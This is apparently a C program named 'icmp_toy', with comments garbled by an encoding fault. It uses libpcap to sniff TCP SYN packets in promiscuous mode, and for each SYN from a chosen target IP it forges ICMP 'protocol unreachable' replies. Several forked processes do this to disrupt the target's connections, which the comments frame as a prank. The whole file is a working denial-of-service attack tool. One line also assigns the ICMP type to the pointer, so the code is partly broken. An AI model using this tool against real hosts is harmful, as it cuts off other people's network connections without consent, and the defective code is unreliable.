//
// �ſ� ���� ���н� ���� ���α׷�
// # cp -f /usr/include/pcap/net/bpf.h /usr/include/net 
// # gcc -g -Wall -o icmp_toy icmp_toy.c -lpcap 
//
#include <sys/types.h> 
#include <sys/time.h> 
#include <netinet/in.h> 
#include <net/ethernet.h> 
#include <pcap/pcap.h> // libpcap�� ���� ���ȭ�� 
#include <signal.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <errno.h> 
#include <unistd.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <netinet/ip_icmp.h> 

#define PROMISCUOUS 1 
// �ڽ� ���μ��� ���� ���� 
static int nchild = 5; 
char target_ip[16]; 

static pid_t *pids; 
static pcap_t *pd; 

// checksum �˰��� ������ �Լ� ���� copy & paste ���� 
unsigned short in_cksum(unsigned short *addr, int len) 
{ 
   int nleft = len; 
   int sum = 0; 
   unsigned short *w = addr; 
   unsigned short answer = 0; 

   while (nleft > 1) { 
      sum += *w++; 
      nleft -= 2; 
   } 

   if (nleft == 1) { 
      *(unsigned char *) (&answer) = *(unsigned char *) w; 
      sum += answer; 
   } 

   sum  = (sum >> 16) + (sum & 0xffff); 
   sum += (sum >> 16); 
   answer = ~sum; 
   return answer; 
} 

/*-------------------------------------------------------------------
icmp packet �� ����� ������ �Լ� : �� ���� ���ͳݰ� ���Ǵ� �ž�!! 
-------------------------------------------------------------------*/ 
void send_icmp(int sockfd, struct iphdr *iph, struct tcphdr *tcph) 
{ 
   char buff[36]; // icmp packet �� ��ü�κ� 

   char data[28]; // icmp data �κ� ip header:20bytes + ulp header:8bytes 

   /* ȭ�鿡 ��� ���� ip�� �ӽ������ϱ� ���� ���� */ 
   int len;
   struct sockaddr     send;
   struct icmp        *icmp;
   struct sockaddr_in *willsend;

   willsend = (struct sockaddr_in *) &send;
   willsend->sin_family      = AF_INET;
   willsend->sin_addr.s_addr = iph->saddr;

   fprintf(stdout,"A player's number is (%d) : Shot!! ---<-@ %s n", getpid(), target_ip); 
   icmp = (struct icmp *) buff; 

   // ������ �̵��� : ICMP type 
   icmp = ICMP_DEST_UNREACH; 
   icmp->icmp_code = ICMP_PROT_UNREACH; 
   icmp->icmp_id   = 0; 
   icmp->icmp_seq  = 0; 
   // icmp data �κ��߿� ��Ŷ�� ip header 
   memcpy(data, iph, 20); 
   // icmp data �κ��߿� ��Ŷ�� Upper Layer Protocol�� ���� 8 bytes 
   memcpy(data + 20, tcph, 8); 
   // data�κ��� icmp_data�κп� ���� 
   memcpy(icmp->icmp_data, data, 28); 
   // ������ �� icmp packet�� ���� : 36 bytes 
   len = 8 + 20 + 8; 
   // icmp checksum field ��� 
   icmp->icmp_cksum = 0; 
   icmp->icmp_cksum = in_cksum((u_short *) icmp, len); 

   // �ϼ��� ICMP packet ������ 
   sendto(sockfd, buff, len, 0, &send, sizeof(send)); 
} 

//
// �峭 ĥ �� ��ip 
void checkip(struct iphdr *iph, struct tcphdr *tcph) 
{ 
   int  sockfd; 
   char source_ip[16]; 

   strcpy(source_ip, (char *)inet_ntoa(iph->saddr)); 

   sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); 
   // ip �� �ƴ� ����... 
   if (strcmp(target_ip, source_ip) == 0) send_icmp(sockfd, iph, tcph); 

   close(sockfd); 
} 

// ip header�� tcp header�� mapping 
void packet_info(char *user, int len) 
{ 
   struct iphdr  *iph; 
   struct tcphdr *tcph; 
   // ip header �� ������ 
   iph  = (struct iphdr *) user; 
   // tcp header �� ������ 
   tcph = (struct tcphdr *) (user + iph->ihl *4); 
   checkip(iph, tcph); 
} 


void sig_int(int sig) 
{ 
   int i; 

   // ��� �ڽ����μ����� ���δ�. 
   for (i=0; i<nchild; i++) kill(pids[i],SIGTERM); 

   /* --------------------------------------------- 
       ��� �ڽ� ���μ����� ���� ������ ��ٸ���. 
       �� �̻� �ڽ����μ����� ������ wait()�� -1�� 
       �����ϱ� ������ while loop�� ���������� �ǰ� 
       �θ� exit(0)�� ���� �����Ѵ�. 
   --------------------------------------------*/ 
   while(wait(NULL) > 0) ; 

   fprintf (stdout,"Bye!!n"); 
   exit(0); 
} 

// prefork����� �̿��� child pool ����� 
pid_t child_make(int i, pcap_t *pd, int datalink) 
{
   pid_t pid; 
   void child_main(int, pcap_t *, int); 

   if ((pid=fork()) > 0) { 
      return pid; // parent �ΰ�� �ڽ����μ����� pid�� ���� 
   } 
   // child�� ��� �Ʒ� �Լ� ȣ�� 
   child_main(i, pd, datalink); 
} 

void child_main(int i, pcap_t *pd, int datalink) 
{ 
   void packet_loop(pcap_t *, int); 

   printf("CHILD %ld starting\n", (long) getpid()); 

   packet_loop(pd, datalink); 
} 

// unp�� �ִ�. 
char *next_pcap(pcap_t *pd, int *len) 
{ 
   char *ptr; 
   struct pcap_pkthdr hdr; 

   while( (ptr = (char *) pcap_next(pd, &hdr)) == NULL) ; 

   *len = hdr.caplen; 
   return (ptr); 
} 

void packet_loop(pcap_t *pd, int datalink) 
{ 
   int   len; 
   char *ptr; 

   /* ----------------------------------------------- 
   ��������� packet�� �о���̴� loop 
   ---------------------------------------------*/ 
   for (;;) { 
       ptr = next_pcap(pd, &len); 
       switch (datalink) { 
       case DLT_EN10MB : 
            packet_info(ptr+14, len-14); 
            break; 
       } 
   } 
} 

void usage(void) 
{ 
   fprintf(stdout, "SYNOPSIS : icmp_toy xxx.xxx.xxx.xxx(target ip address)\n"); 
} 

int main(int argc, char *argv[]) 
{ 
   struct bpf_program fcode; 
   char *device, *filter_rule; 
   char  ebuf[PCAP_ERRBUF_SIZE]; 
   int i, j, snaplen = 68; 
   bpf_u_int32 localnet, netmask; 

   //�ñ׳� ��� 
   signal(SIGINT, sig_int); 

   if (argc < 2) { 
      usage(); 
      exit(1); 
   } 

   // �峭 ĥ ��ǻ�� ȣ��Ʈ �ּҸ� ����... 
   strcpy(target_ip, argv[1]); 

   /* --------------------------------------- 
   tcp syn packet�� ���͸��Ѵ� 
   --------------------------------------*/ 
   filter_rule   = "tcp and tcp[13:1] & 2 != 0"; 
   //filter_rule = "ip"; 

   device = pcap_lookupdev(ebuf); 
   if (device == NULL) { 
      perror(ebuf); 
      exit(1); 
   }

   pd = pcap_open_live(device, snaplen, PROMISCUOUS, 1000, ebuf); 
   if (pd == NULL) { 
      perror(ebuf); 
      exit(1); 
   } 

   i = pcap_snapshot(pd); 
   if (snaplen < i) { 
      perror(ebuf); 
      exit(1); 
   } 

   if (pcap_lookupnet(device, &localnet, &netmask, ebuf) < 0) { 
      perror(ebuf); 
      exit(1); 
   } 

   setuid(getuid()); 

   if (pcap_compile(pd, &fcode, filter_rule, 0, netmask) < 0) { 
      perror(ebuf); 
      exit(1); 
   } 

   if (pcap_setfilter(pd, &fcode) < 0) { 
      perror(ebuf); 
      exit(1); 
   } 

   fflush(stderr); 

   pids = calloc(nchild, sizeof(pid_t)); 
   /* ---------------------------------------------- 
   nchild ��ŭ �ڽ����μ����� �����ϱ� ���� loop 
   --------------------------------------------*/ 
   for (j=0; j<nchild; j++) 
       pids[j] = child_make(j, pd, pcap_datalink(pd)); 

   for (;;) pause(); // signal �� �߻��Ҷ����� ������ ������Ų��. 
} 
